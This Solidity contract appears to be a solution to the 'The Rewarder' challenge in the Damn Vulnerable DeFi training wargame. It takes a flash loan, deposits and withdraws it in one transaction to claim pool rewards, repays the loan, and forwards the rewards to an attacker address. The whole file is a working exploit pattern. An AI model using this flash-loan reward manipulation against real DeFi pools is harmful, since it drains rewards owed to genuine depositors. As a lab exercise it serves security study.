pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract TheRewarderAttacker {
    using Address for address;

    address private immutable attacker;
    address private immutable flashLoanPool;
    address private immutable rewardPool;

    DamnValuableToken private immutable liquidityToken;
    RewardToken private immutable rewardToken;

    constructor(
        address attackerAddress,
        address flashLoanPoolAddress,
        address rewardPoolAddress,
        address liquidityTokenAddress,
        address rewardTokenAddres
    ) public {
        attacker = attackerAddress;
        flashLoanPool = flashLoanPoolAddress;
        rewardPool = rewardPoolAddress;

        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddres);
    }

    function execute(uint256 amount) external {
        FlashLoanerPool(flashLoanPool).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(
            liquidityToken.balanceOf(address(this)) == amount,
            "Not enough token received"
        );

        require(
            liquidityToken.approve(rewardPool, amount),
            "Could not approve deposit"
        );

        TheRewarderPool(rewardPool).deposit(amount);
        TheRewarderPool(rewardPool).withdraw(amount);

        liquidityToken.transfer(flashLoanPool, amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
